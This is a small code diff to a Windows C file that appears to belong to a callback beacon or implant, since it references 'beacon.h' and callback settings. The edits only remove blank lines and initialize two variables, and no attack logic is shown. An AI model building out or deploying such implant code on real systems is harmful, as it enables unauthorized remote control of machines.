@@ -1,7 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 
 // headers needed so we can function
-
 #include <windows.h>
 #include <stdio.h>
 
@@ -11,7 +10,6 @@
 #include "beacon.h"
 
 // dynamic header file, contains all info for callback
-
 #include "settings.h"
 
 void __attribute__ ((constructor)) entry()
@@ -35,8 +33,8 @@ void __attribute__ ((constructor)) entry()
 void main()
 {
     BOOL     Success;
-    DWORD    OpCode;
-    char*    Buffer;
+    char*    Buffer   = NULL;
+    DWORD    OpCode   = 0;
     DWORD    dwSize   = 63;
     BOOL     retValue = TRUE;
     CHAR     lpcUserName[256];
